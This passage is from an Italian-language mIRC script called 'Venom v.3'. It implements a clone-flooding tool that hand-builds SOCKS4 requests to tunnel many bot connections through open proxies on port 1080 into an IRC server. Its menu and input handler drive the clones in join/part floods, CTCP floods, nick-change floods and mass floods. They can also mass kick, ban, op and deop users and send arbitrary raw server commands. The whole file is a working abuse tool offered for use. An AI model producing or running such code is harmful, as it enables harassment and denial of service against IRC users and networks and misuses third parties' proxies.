n191=;===========================================Venom[v.3]============================================
n192=;=> Firewall Clones
n193=on *:DNS:{
n194=  if (%fw.cloning == 1) {
n195=    .set %fw.cloning 0
n196=    .set %fw.server $iaddress
n197=    go1
n198=  }
n199=}
n200=alias go {
n201=  if ($1 == $null || $2 == $null || $3 == $null) { echo 0 -a [usage, /go [firewall] [quanti] [server] [porta] ] | halt }
n202=  if ($4 != $null) { .set %fw.port $4 } | else { .set %fw.port 6667 }
n203=  skwinchk | .set %fw.granted 0 | .set %fw.connected 0 | .set %fw.current2 0 | .set %fw.proxy $1 | .set %fw.amount $2 | .set %fw.cloning 1 | .set %port.byte1 %fw.port / 256 | .set %port.byte2 %fw.port % 256 | .dns $3
n204=  aline 9  @fwclones Connessione di $$2 cloni, su $$3, usando $$1 $+ 
n205=}
n206=alias go1 { .sockopen firewall %fw.proxy 1080 }
n207=alias goex { if (%fw.amount == %fw.current2) { clear @fwclones | .timer 1 5 aline 9  @fwclones [caricamento terminato, attendere qualche secondo per la connessione degli ultimi] | halt } | .sockopen firewall %fw.proxy 1080 }
n208=;===========================================Venom[v.3]============================================
n209=on *:sockopen:firewall:{
n210=  if ($sockerr > 0) { .aline 9  @fwclones [errore apertura socket, chiusura sock $sockname $+ ] | return }
n211=  bset &binvar 1 4 | bset &binvar 2 1 | bset &binvar 3 $int(%port.byte1) | bset &binvar 4 %port.byte2 | bset &binvar 5 $gettok(%fw.server,1,46) | bset &binvar 6 $gettok(%fw.server,2,46) | bset &binvar 7 $gettok(%fw.server,3,46) | bset &binvar 8 $gettok(%fw.server,4,46) | bset &binvar 9 0  
n212=  .sockwrite firewall &binvar | if (%fw.connected != 1) { .aline 9  @fwclones [ $+ $sockname $+ ] connesso al firewall, inviati dati binari.. | .set %fw.connected 1 }
n213=}
n214=on *:sockread:firewall:{
n215=  if ($sockerr > 0) { .aline 9  @fwclones [errore lettura socket, chiusura sock $sockname $+ ] | return }
n216=  .aline 9  @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] firewall aperta..
n217=  :nextread1 | sockread 4096 &binvar | if ($sockbr == 0) { return }
n218=  if ($bvar(&binvar,2) == 90) {
n219=    .inc %fw.current2
n220=    %fw.sock = fw $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ [ [ %fw.current2 ] ]
n221=    .sockrename $sockname %fw.sock | .sockmark %fw.sock x $+ %fw.sock $+ x | .sockwrite -n %fw.sock NICK $sock(%fw.sock).mark
n222=    if (%fw.identd == 0) { .sockwrite -n %fw.sock USER  $+ $rand(0,15) $+ $chr(44) $+ $rand(0,15) $+  $+ $rand(a,z) $+ $rand(A,Z) "venom" "venom.com" ::Venom storm: $+ : %fw.sock : $+ :Fj: }
n223=    elseif (%fw.ident == 1) { .sockwrite -n %fw.sock USER %fw.identd.x "venom" "venom.com" ::Venom storm: $+ : %fw.sock : $+ :uk: }
n224=    else { .sockwrite -n %fw.sock USER $replace($rname,$chr(124),i) "venom" "venom.com" ::Venom storm: $+ : %fw.sock : $+ :uk: }
n225=    if (%fw.granted != 1) { .aline 9  @fwclones [ $+ %fw.sock $+ : $+ $sock(%fw.sock).mark $+ ] accesso firewall effettuato, connessione al server [ident/nick( $+ $sock(%fw.sock).mark $+ )] | .timer90 0 30 /antiidle | .set %fw.granted 1 }
n226=    .timer92 1 7 /goex
n227=  } | if ($bvar(&binvar,2) == 91) { .aline 9  @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] accesso firewall rifiutato, codice 91. }
n228=}
n229=;===========================================Venom[v.3]============================================
n230=#socketignore off
n231=on 1:sockread:fw*:{ halt }
n232=#socketignore end
n233=;===========================================Venom[v.3]============================================
n234=on *:sockread:fw*:{
n235=  .skwinchk | if ($sockerr > 0) { .aline 9  @fwclones [errore lettura socket, chiusura sock $sockname $+ ] | return }
n236=  :nextread1 | sockread 4096 %temp | if ($sockbr == 0) { return } | if (%temp == $null) { %temp = - }
n237=  if ($gettok(%temp,1,32) == PING) { .sockwrite -n $sockname PONG : $+ %fw.proxy | halt }
n238=  if ($gettok(%temp,4,32) == :If) { .aline 1 @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] invio /PONG $gettok(%temp,15,32) per connettere. | .sockwrite -n $sockname PONG $gettok(%temp,15,32) }
n239=  if ($gettok(%temp,2,32) == 001) { .aline 1 @fwclones [firewall: $+ $sockname $+ :nick clone: $+ $sock($sockname).mark $+ ] clone connesso. | .sockwrite -n $sockname mode $sock($sockname).mark +i }
n240=  if ($gettok(%temp,1,32) == ERROR) { if (closing isin $gettok(%temp,2,32)) { .aline 1 @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ : $gettok(%temp,2-,32) $+ ] | halt } }
n241=  if (KICK isin $gettok(%temp,2,32)) { sockwrite -tn $sockname JOIN $gettok(%temp,3,32)}}
n242=}
n243=on *:sockclose:firewall:{ .skwinchk | .aline 1 @fwclones [ $+ $sockname $+ ] firewall chiusa dall'host o rifiutata dal server. }
n244=on *:sockclose:fw*:{ .skwinchk | aline 1 @fwclones Cloni correntemente attivi: $sock(fw*,0) $+ . }
n245=;===========================================Venom[v.3]============================================
n246=menu @fwclones {
n247=  Avvia cloni:{ go $$?="Firewall? (1080)" $$?="Numero cloni?" $$?="Server? (dev'essere IP)" }
n248=  Ident
n249=  .Casuali (normale):{ set %fw.identd 3 | echo 9 -a Gli ident dei cloni saranno nomi casuali. }
n250=  .Colorati:{ set %fw.identd 0 | echo 9 -a Gli ident dei cloni saranno colorati (non funziona con tutti i server). }
n251=  .Preimpostati:{ set %fw.identd 1 | .set %fw.identd.x $$?="Ident?" | echo 9 -a Gli idents dei cloni saranno %fw.identd.x $+ . }
n252=  -
n253=  Pre-imposta nicks:{ fw.setnick $$?="preimposta nick cloni con?" }
n254=  Leggi nicks da elenco:{ fw.nicklist }
n255=  -
n256=  Vai al canale:{ skwinchk | .sockwrite -n fw* JOIN $$?="Canale?" | .aline 1 @fwclones [i cloni stanno andando su $! $+ ] }
n257=  Parti dal canale:{ skwinchk | .sockwrite -n fw* PART $$?="Canale?" : $+ %df | .aline 9  @fwclones [i cloni stanno partendo da $! $+ ] }
n258=  -  
n259=  Comandi
n260=  .op:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" +ooo $$?="Nick(s)?" | .aline 9  @fwclones [i cloni stanno oppando $! $+ ] }
n261=  .deop:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" -ooo $$?="Nick(s)?" | .aline 9  @fwclones [i cloni stanno deoppando $! $+ ] }
n262=  .kick:{ skwinchk | .sockwrite -n fw* KICK #$$?="Canale?" $$?="Nick(s)?" :DarKBoGuS | .aline 9  @fwclones [i cloni hanno kickato $! $+ ] }
n263=  .ban:{ skwinchk | .sockwrite -n fw* MODE #$$?="Canale?" +bbb $$?="Mask(s)?" | .aline 9  @fwclones [i cloni hanno bannato $! $+ ] }
n264=  .-
n265=  .parla:{ skwinchk | .sockwrite -n fw* PRIVMSG $$?="Nick/canale?" : $+ $?="Cosa vuoi dirgli?" | .aline -p @fwclones [i cloni hanno parlato] }
n266=  .-
n267=  .comando?:{ skwinchk | .sockwrite -n fw* $$?="Comando RAW da inviare?" | .aline -p @fwclones [i cloni hanno effettuato il comando $! $+ ] }
n268=  -
n269=  Floods
n270=  .join/part:{ skwinchk | /sockwrite -n fw* JOIN $$?="Canale?" | sockwrite -n fw* PART $! : $+ %df | .aline  @fwclones [i cloni sono entrati ed usciti da $! $+ ] }
n271=  .join/part(massa):{ jp $$?="Canale?" }
n272=  .join/part(quante volte?):{ set %temp.jpchan $$?="Canale?"
n273=    set %temp.jpht $$?="Quante volte?"
n274=    :nextjp
n275=    inc %temp.jpt
n276=    jp %temp.jpchan
n277=    if (%temp.jpt <= %temp.jpht) { goto nextjp }
n278=  }
n279=  .-
n280=  .flood ctcp:{ fwctcp $$?="Nick/Canale?" }
n281=  .flood cambi nick:{ fw.nickflood | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood }
n282=  .-
n283=  .flood massa:{ sockwrite -n fw* JOIN $$?="What Channel?" | .timer 1 6 /fw.nickflood | .timer 1 12 /fw.nickflood | .timer 1 18 /fw.nickflood | .timer 1 25 /fwctcp $! }
n284=  Reimposta nick cloni:{ clonereset }
n285=  -
n286=  Termina
n287=  .Tutti i cloni:{ cleanup }
n288=  .Connessione a firewall:{ skwinchk | /sockclose firewall | .aline  @fwclones [connessione a firewall annullata] | .timer90 off | .timer92 off }
n289=  .-
n290=  .Tutto:{ sockclose fw* | .aline  @fwclones [chiusi tutti i sockets] | .timer90 off | .timer92 off }
n291=  -
n292=  Chiudi finestra:{ window -c @fwclones }
n293=}
n294=;===========================================Venom[v.3]============================================
n295=on *:INPUT:@fwclones: {
n296=  if ($sock(fw*,0) == 0) { echo @fwclones nessun clone attivo. | halt }
n297=  if ($1) {
n298=    goto $1 | halt
n299=    :ctcpflood | fwctcp $$1 | halt
n300=    :nickflood | fw.nickflood | halt
n301=    :join | .sockwrite -n fw* JOIN $$1 $2- | halt
n302=    :part | .sockwrite -n fw* PART $$1 : $+ %logo | halt
n303=    :quit | cleanup $1 | .timer 1 4 .window -c @fwclones | halt
n304=    :dieclones | sockclose fw* | echo @fwclones tutte le connessioni cloni/firewall sono state chiuse. | .timer90 off | .timer92 off | halt
n305=    :raw | sockwrite -n fw* $1-
n306=    :cd | setc $1-
n307=    :help
n308=    echo @fwclones Guida, sono disponibili i seguenti comandi.
n309=    echo @fwclones --------------------------------------------    
n310=    echo @fwclones /join #canale
n311=    echo @fwclones /part #canale
n312=    echo @fwclones /quit <messaggio>
n313=    echo @fwclones /nickflood
n314=    echo @fwclones /ctcpflood nick/#canale
n315=    echo @fwclones /dieclones
n316=    echo @fwclones /raw <comando per il server>
n317=    echo @fwclones /cd nick nick nick nick nick nick etc etc.
n318=    echo @fwclones /help
n319=    halt
n320=    :default
n321=  }
n322=}
n323=;===========================================Venom[v.3]============================================
n324=alias skwinchk { if ($window(@fwclones) == $null) { .window -e @fwclones 100 200 600 200 @fwclones Verdana 13 | titlebar @fwclones finestra stato cloni wingate/firewall, visualizzare /help | echo @fwclones [per la guida digitare /help nella finestra @fwclones] } }
n325=alias antiidle { set %sockx $sock(fw*,0) | if (%sockx > 0) { .sockwrite -n fw* PONG 127.0.0.1 } | aline 1 @fwclones Cloni correntemente attivi: $sock(fw*,0) $+ . }
n326=alias cleanup { if ($1 == $null) { .set %fwclone.quit gameover } | else { .set %fwclone.quit $1 } | .skwinchk | .enable #socketignore | .timer 1 10 .disable #socketignore | set %sockz $sock(*,0) | if (%sockz > 0) { sockwrite -n fw* QUIT :venom..( $+ %fwclone.quit $+ ) | .timer 1 10 /sockclose fw* | .aline 9  @fwclones [terminati tutti i cloni] : [connessione firewall annullata] : [chiusi tutti i sockets] | .timer90 off | .timer92 off | halt } | .aline  @fwclones [nessun clone correntemente attivo] | .sockclose f* }
n327=alias rname { if ($exists($mircdirdati\bogus.txt)) { %identd = $read -n $mircdirdati\bogus.txt | return %identd | halt } | %identd = $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(A,Z) | return %identd | halt }
n328=alias fwall { .sockwrite -n fw* $1- }
n329=alias fwctcp {
n330=  .skwinchk
n331=  .enable #socketignore
